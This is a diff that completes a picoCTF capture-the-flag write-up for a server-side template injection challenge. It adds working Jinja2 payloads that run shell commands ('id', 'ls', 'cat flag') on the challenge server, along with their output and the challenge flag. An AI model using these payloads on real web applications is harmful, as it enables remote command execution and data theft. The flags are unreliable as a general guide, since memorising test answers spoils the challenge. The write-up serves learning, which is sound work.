@@ -94,30 +94,43 @@ picoCTF{y0u_m4d3_1t_79a0ddc6}
 # 2. SSTI1
 > I made a cool website where you can announce whatever you want! Try it out!
 Additional details will be available after launching your challenge instance.
-
-
+http://rescued-float.picoctf.net:62549/
 
 ## Solution:
-- 
-
+- The hint says that we have to use a technique called server side template injection
+- This is a type of vulnerability where a website will render user input as a template of some sort
+- i found a command vulnerability in the web {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+- here whatever you put inside popen is treated as a command
+- so i write 
 ```
-
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
 ```
+- this shows me the list of files and directories
+```
+__pycache__ app.py flag requirements.txt
+```
+-then i enter the final command
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
+```
+-and it gives off the flag : picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
 ```
 
 ## Concepts learnt:
--
+-ssti
 
 ## Notes:
--
+- none
 
 ## Resources:
--
+- https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/
+- https://portswigger.net/web-security/server-side-template-injection
+- https://onsecurity.io/article/server-side-template-injection-with-jinja2/
 
 ***
 
